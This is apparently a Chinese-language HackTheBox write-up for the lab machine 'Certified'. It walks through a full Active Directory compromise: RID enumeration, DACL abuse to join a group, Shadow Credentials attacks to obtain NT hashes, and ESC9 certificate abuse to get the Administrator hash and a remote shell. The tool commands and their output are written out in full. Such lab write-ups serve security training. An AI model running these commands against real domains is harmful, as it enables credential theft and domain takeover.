---
title: "HTB Certified"
description: "HackTheBox篇ADCS系列之Certified"

date: 2025-03-24T15:25:55+08:00
lastmod: 2025-11-11T15:10:15+08:00

math: true
mermaid: true

categories:
  - HackTheBox
tags:
  - Windows
  - ADCS-ESC9
  - Shadow Credentials
  - DACL abuse
---
<!--more-->

> 靶机ip：10.10.11.41

# 知识点

* DACL滥用横向移动
* Shadow Credentials 攻击
* (no security extension)ESC9提权

# 信息收集

```shell
rustscan -a 10.10.11.41 -u 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Open ports, closed hearts.

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.41:53
Open 10.10.11.41:88
Open 10.10.11.41:135
Open 10.10.11.41:139
Open 10.10.11.41:389
Open 10.10.11.41:445
Open 10.10.11.41:464
Open 10.10.11.41:593
Open 10.10.11.41:636
Open 10.10.11.41:3268
Open 10.10.11.41:3269
Open 10.10.11.41:5985
Open 10.10.11.41:9389
Open 10.10.11.41:49669
Open 10.10.11.41:49666
Open 10.10.11.41:49673
Open 10.10.11.41:49674
Open 10.10.11.41:49683
Open 10.10.11.41:49713
Open 10.10.11.41:49737
Open 10.10.11.41:59767
```

# SMB服务

平台提供了一组用户名密码

```info
username: judith.mader
password: judith09
```

查看smb共享

```shell
netexec smb 10.10.11.41 -u judith.mader -p judith09 --shares
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\judith.mader:judith09
SMB         10.10.11.41     445    DC01             [*] Enumerated shares
SMB         10.10.11.41     445    DC01             Share           Permissions     Remark
SMB         10.10.11.41     445    DC01             -----           -----------     ------
SMB         10.10.11.41     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.41     445    DC01             C$                              Default share
SMB         10.10.11.41     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.41     445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.41     445    DC01             SYSVOL          READ            Logon server share
```

没什么信息，尝试枚举RID

```shell
netexec smb 10.10.11.41 -u "judith.mader" -p "judith09" --rid-brute --log smb_rid_brute
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\judith.mader:judith09
SMB         10.10.11.41     445    DC01             498: CERTIFIED\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.41     445    DC01             500: CERTIFIED\Administrator (SidTypeUser)
SMB         10.10.11.41     445    DC01             501: CERTIFIED\Guest (SidTypeUser)
SMB         10.10.11.41     445    DC01             502: CERTIFIED\krbtgt (SidTypeUser)
SMB         10.10.11.41     445    DC01             512: CERTIFIED\Domain Admins (SidTypeGroup)
SMB         10.10.11.41     445    DC01             513: CERTIFIED\Domain Users (SidTypeGroup)
SMB         10.10.11.41     445    DC01             514: CERTIFIED\Domain Guests (SidTypeGroup)
SMB         10.10.11.41     445    DC01             515: CERTIFIED\Domain Computers (SidTypeGroup)
SMB         10.10.11.41     445    DC01             516: CERTIFIED\Domain Controllers (SidTypeGroup)
SMB         10.10.11.41     445    DC01             517: CERTIFIED\Cert Publishers (SidTypeAlias)
SMB         10.10.11.41     445    DC01             518: CERTIFIED\Schema Admins (SidTypeGroup)
SMB         10.10.11.41     445    DC01             519: CERTIFIED\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.41     445    DC01             520: CERTIFIED\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.41     445    DC01             521: CERTIFIED\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.41     445    DC01             522: CERTIFIED\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.41     445    DC01             525: CERTIFIED\Protected Users (SidTypeGroup)
SMB         10.10.11.41     445    DC01             526: CERTIFIED\Key Admins (SidTypeGroup)
SMB         10.10.11.41     445    DC01             527: CERTIFIED\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.41     445    DC01             553: CERTIFIED\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.41     445    DC01             571: CERTIFIED\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.41     445    DC01             572: CERTIFIED\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.41     445    DC01             1000: CERTIFIED\DC01$ (SidTypeUser)
SMB         10.10.11.41     445    DC01             1101: CERTIFIED\DnsAdmins (SidTypeAlias)
SMB         10.10.11.41     445    DC01             1102: CERTIFIED\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.41     445    DC01             1103: CERTIFIED\judith.mader (SidTypeUser)
SMB         10.10.11.41     445    DC01             1104: CERTIFIED\Management (SidTypeGroup)
SMB         10.10.11.41     445    DC01             1105: CERTIFIED\management_svc (SidTypeUser)
SMB         10.10.11.41     445    DC01             1106: CERTIFIED\ca_operator (SidTypeUser)
SMB         10.10.11.41     445    DC01             1601: CERTIFIED\alexander.huges (SidTypeUser)
SMB         10.10.11.41     445    DC01             1602: CERTIFIED\harry.wilson (SidTypeUser)
SMB         10.10.11.41     445    DC01             1603: CERTIFIED\gregory.cameron (SidTypeUser)
```

发现很多用户名，并且保存到` smb_rid_brute`文件中了，将用户名提取出来

```shell
cat smb_rid_brute | grep SidTypeUser | awk -F'\' '{print $2}' | awk -F ' ' '{print $1}'
Administrator
Guest
krbtgt
DC01$
judith.mader
management_svc
ca_operator
alexander.huges
harry.wilson
gregory.cameron
```

保存到`users.txt`中

# 后信息收集

由于smb并没有找到有用的信息，所以我们尝试一下使用`rusthound`信息收集

```shell
rusthound -d certified.htb -i 10.10.11.41 -u 'judith.mader@certified.htb' -p 'judith09' -z
```

将结果使用`blood-hound`打开

搜索`judith.mader`后，点击`Transitive Object Control`

![image-20250324174532205](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250324174533300-1181721652.png)

注意到下面有一条感觉可以利用的路线

将`CA_OPERATOR@CERTIFIED.HTB`设置为`Ending Node`

![image-20250324174708988](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250324174709742-520340874.png)

所以我们就可以总结出一条攻击路径

1. Judith Mader 对 Management 组具有 **WriteOwner** 权限
2. Management 组对Management_SVC 账户具有 **GenericWrite** 权限。
3. Management_SVC 账户对 CA_Operator 用户具有 **GenericAll** 权限。

# 提权至Management_SVC 

> 参考链接：
>
> https://www.thehacker.recipes/ad/movement/dacl/grant-ownership
>
> https://www.thehacker.recipes/ad/movement/dacl/grant-rights

将 `judith.mader` 设置为 `Management` 组的所有者

```shell
impacket-owneredit -action write -new-owner judith.mader -target management certified/judith.mader:judith09 -dc-ip 10.10.11.41
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!
```

授予 `judith.mader` 用户 `WriteMembers` 权限

```shell
impacket-dacledit  -action 'write' -rights 'WriteMembers' -target-dn "CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB" -principal "judith.mader" "certified.htb/judith.mader:judith09"
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] DACL backed up to dacledit-20250324-224240.bak
[*] DACL modified successfully!
```

把 `judith.mader`自己加入到 `Management` 组里面

```shell
bloodyAD --host 10.10.11.41 -d 'certified.htb' -u 'judith.mader' -p 'judith09' add groupMember "Management" "judith.mader"
[+] judith.mader added to Management
```

对用户 `management_svc` 执行 `Shadow Credentials` 攻击，在这之前先同步下时间

```shell
ntpdate certified.htb

certipy-ad shadow auto -u judith.mader@certified.htb -p judith09 -account management_svc -target certified.htb -dc-ip 10.10.11.41
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '55d5d613-2078-565b-d5a1-bf72319db12c'
[*] Adding Key Credential with device ID '55d5d613-2078-565b-d5a1-bf72319db12c' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID '55d5d613-2078-565b-d5a1-bf72319db12c' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Using principal: management_svc@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```

可以看到已经获取到`management_svc`的`hash`了，使用`netexec`验证一下

```shell
netexec winrm 10.10.11.41 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
WINRM       10.10.11.41     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
WINRM       10.10.11.41     5985   DC01             [+] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584 (Pwn3d!)
```

 使用`evil-winrm`登录

```shell
evil-winrm -i 10.10.11.41 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\management_svc\Documents> whoami
certified\management_svc
```

登陆成功，在`Desktop`找到`user.txt`

# 提权至CA_Operator

继续之前分析得到的攻击思路

**Management_SVC 账户对 CA_Operator 用户具有 GenericAll 权限。**

所以可以使用刚才的攻击在进行一次来获取`CA_Operator`用户的hash

```shell
certipy-ad shadow auto -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -account CA_Operator -target certified.htb -dc-ip 10.10.11.41
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '79f04777-d3db-28f8-ed32-196d3f669f37'
[*] Adding Key Credential with device ID '79f04777-d3db-28f8-ed32-196d3f669f37' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID '79f04777-d3db-28f8-ed32-196d3f669f37' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Using principal: ca_operator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
```

使用`netexec`枚举

```shell
netexec winrm 10.10.11.41 -u ca_operator -H b4b86f45c6018f1b664f70805f45d8f2
WINRM       10.10.11.41     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
WINRM       10.10.11.41     5985   DC01             [-] certified.htb\ca_operator:b4b86f45c6018f1b664f70805f45d8f2

netexec ldap 10.10.11.41 -u ca_operator -H b4b86f45c6018f1b664f70805f45d8f2
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.41     389    DC01             [+] certified.htb\ca_operator:b4b86f45c6018f1b664f70805f45d8f2

netexec smb 10.10.11.41 -u ca_operator -H b4b86f45c6018f1b664f70805f45d8f2
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\ca_operator:b4b86f45c6018f1b664f70805f45d8f2
```

发现并不能通过`winrm`协议登录

# ESC9提权至root

尝试使用该用户查找ADCS

```shell
netexec ldap 10.10.11.41 -u ca_operator -H b4b86f45c6018f1b664f70805f45d8f2 -M adcs
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.41     389    DC01             [+] certified.htb\ca_operator:b4b86f45c6018f1b664f70805f45d8f2
ADCS        10.10.11.41     389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.10.11.41     389    DC01             Found PKI Enrollment Server: DC01.certified.htb
ADCS        10.10.11.41     389    DC01             Found CN: certified-DC01-CA
```

继续使用`certipy-ad`尝试寻找一下利用点

```shell
certipy-ad find -u ca_operator -hashes b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.10.11.41 -stdout -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'certified-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'certified-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'certified-DC01-CA' via RRP
[*] Got CA configuration for 'certified-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectAltRequireUpn
    Enrollment Flag                     : NoSecurityExtension
                                          AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Property Principals       : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
    [!] Vulnerabilities
      ESC9                              : 'CERTIFIED.HTB\\operator ca' can enroll and template has no security extension
```

发现可以使用ESC9提权

> 参考链接：https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension

链接里详细列出了利用条件以及利用过程

先将`ca_operator`的 `userPrincipalName` 更改为 `Administrator`

```shell
certipy-ad account update -u "management_svc@certified.htb" -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
```

通过 `ca_operator` 请求易受攻击的证书。

```shell
certipy-ad req -u "ca_operator@certified.htb" -hashes "b4b86f45c6018f1b664f70805f45d8f2" -target 10.10.11.41 -ca 'certified-DC01-CA' -template CertifiedAuthentication
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 5
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

`ca_operator` 的 UPN 将更改回其他值。

```shell
certipy-ad account update -u "management_svc@certified.htb" -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn "ca_operator@certified.htb"
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```

使用获取的证书获取Admiinistrator的hash

```shell
certipy-ad auth -pfx 'administrator.pfx' -domain "certified.htb"
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

拿到`administrator`的`hash`，使用`netexec`验证一下

```shell
netexec winrm 10.10.11.41 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
WINRM       10.10.11.41     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
WINRM       10.10.11.41     5985   DC01             [+] certified.htb\Administrator:0d5b49608bbce1751f708748f67e2d34 (Pwn3d!)
```

使用`evil-winrm`登录

```shell
evil-winrm -i 10.10.11.41 -u Administrator -H 0d5b49608bbce1751f708748f67e2d34

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
certified\administrator
```

登陆成功，在`Desktop`找到`root.txt`